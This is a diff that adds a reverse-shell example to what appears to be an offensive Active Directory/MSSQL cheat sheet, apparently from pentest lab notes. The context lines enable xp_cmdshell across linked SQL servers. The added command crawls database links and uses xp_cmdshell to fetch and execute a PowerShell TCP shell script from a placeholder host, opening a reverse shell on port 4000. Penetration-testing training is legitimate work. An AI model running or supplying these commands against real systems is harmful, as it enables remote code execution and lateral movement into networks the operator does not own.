@@ -1124,3 +1124,8 @@ Execute(‘sp_configure “xp_cmdshell”,1;reconfigure;’) AT “<sql instance
 ```
 Get-SQLServerLinkCrawl -Instance <sql instance> -Query "exec master..xp_cmdshell 'whoami'"
 ```
+
+#### Execute reverse shell example
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
+```
